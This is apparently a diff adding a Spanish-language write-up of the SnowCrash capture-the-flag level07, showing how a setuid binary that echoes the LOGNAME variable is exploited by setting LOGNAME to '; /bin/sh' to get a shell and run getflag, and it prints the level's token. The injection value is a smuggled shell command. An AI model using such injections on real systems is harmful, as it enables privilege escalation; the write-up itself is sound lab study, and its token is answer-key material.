@@ -1,0 +1,45 @@
+level07
+
+
+
+
+	usando strings sobre el binario he encontro esto:
+
+	LOGNAME
+	/bin/echo %s 
+	;*2$"
+	GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
+	gid
+	uid
+
+	una pequeña pista, he investigado que era LOGNAME en este caso y he descubierto con printenv que era una variable de entorno
+
+	el script imprime siempre el valor de la variable de entorno ya que la he modificado y he conseguido que el script imprima ese resultado
+
+	asi que he estado probando e investigando:
+
+	level07@SnowCrash:~$ LOGNAME="./getflag"
+	level07@SnowCrash:~$ printenv LOGNAME
+	./getflag
+	level07@SnowCrash:~$ ./level07 
+	./getflag
+	level07@SnowCrash:~$ printf(getenv("LOGNAME"));
+	-bash: syntax error near unexpected token `getenv'
+	level07@SnowCrash:~$ printf(getenv("LOGNAME"));
+	-bash: syntax error near unexpected token `getenv'
+	level07@SnowCrash:~$ export LOGNAME="'id'"
+	level07@SnowCrash:~$ ./level07 
+	id
+	level07@SnowCrash:~$ export LOGNAME="%x %x %x %x"
+
+
+	asi que he descubierto que puedo abrir una shell interactiva con :
+
+	export LOGNAME="; /bin/sh"
+
+	y bingo, abre una shell al ejecutar el script, usamos getflag, y funciona, tenemos flag.
+
+	$ getflag             
+	Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+
